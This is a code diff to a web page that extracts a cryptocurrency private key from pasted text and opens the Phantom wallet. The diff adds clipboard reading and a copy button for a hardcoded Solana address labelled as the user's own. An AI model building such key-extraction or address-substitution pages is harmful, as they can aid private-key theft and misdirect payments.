@@ -13,6 +13,9 @@
     <label for="inputText">Enter the message containing the private key:</label><br>
     <textarea id="inputText" rows="6" cols="50" oninput="extractPrivateKey()"></textarea><br><br>
 
+    <!-- Button to paste the clipboard contents into the text box -->
+    <button onclick="pasteFromClipboard()">Paste</button><br><br>
+
     <!-- Display the extracted Private Key -->
     <label for="extractedKey">Extracted Private Key:</label><br>
     <textarea id="extractedKey" rows="2" cols="50" readonly></textarea><br><br>
@@ -22,6 +25,15 @@
 
     <!-- Button to open Phantom App -->
     <button onclick="openPhantomApp()">Open Phantom Wallet</button>
+
+    <br><br>
+
+    <!-- Display Typed Solana Address -->
+    <h2>Your Solana Address:</h2>
+    <p id="solanaAddress">2tZVQexFypXkFzAZgqcZKtpkLGYY6UWc8UsNv5QGZ4tQ</p>
+
+    <!-- Button to copy the Solana address -->
+    <button onclick="copySolanaAddress()">Copy Solana Address</button>
 
     <script>
         // This function extracts the private key from the input text
@@ -70,6 +82,30 @@
             setTimeout(function() {
                 window.location.href = fallbackURL;
             }, 1000); // 1 second delay before redirecting to the website
+        }
+
+        // Function to paste the clipboard contents into the input text area
+        function pasteFromClipboard() {
+            navigator.clipboard.readText()
+                .then(text => {
+                    document.getElementById('inputText').value = text;
+                    extractPrivateKey(); // Extract the private key immediately after pasting
+                })
+                .catch(err => {
+                    alert('Failed to paste: ' + err);
+                });
+        }
+
+        // Copy Solana address to clipboard
+        function copySolanaAddress() {
+            const solanaAddress = document.getElementById('solanaAddress').textContent;
+            navigator.clipboard.writeText(solanaAddress)
+                .then(() => {
+                    alert('Solana Address copied to clipboard!');
+                })
+                .catch(err => {
+                    alert('Failed to copy: ' + err);
+                });
         }
     </script>
 </body>
